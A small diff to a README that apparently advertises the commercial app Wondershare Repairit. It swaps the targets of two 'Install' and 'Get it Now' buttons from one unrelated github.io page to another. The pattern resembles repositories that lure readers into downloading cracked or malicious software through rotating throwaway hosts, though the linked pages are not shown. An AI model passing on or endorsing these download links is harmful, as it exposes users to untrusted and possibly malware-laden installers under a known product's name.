@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gunbpx.github.io/.github/wondershareRepairit)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://maopolo-sot.github.io/.github/wondershareRepairit)
 
 </div>
 
@@ -81,7 +81,7 @@ Repairit's advanced video repair mode with sample video reference addresses the 
 
 <p align="center">
 
-[![Get it Now Wondershare Repairit](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/wondershareRepairit)
+[![Get it Now Wondershare Repairit](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/wondershareRepairit)
 
 </p>
 
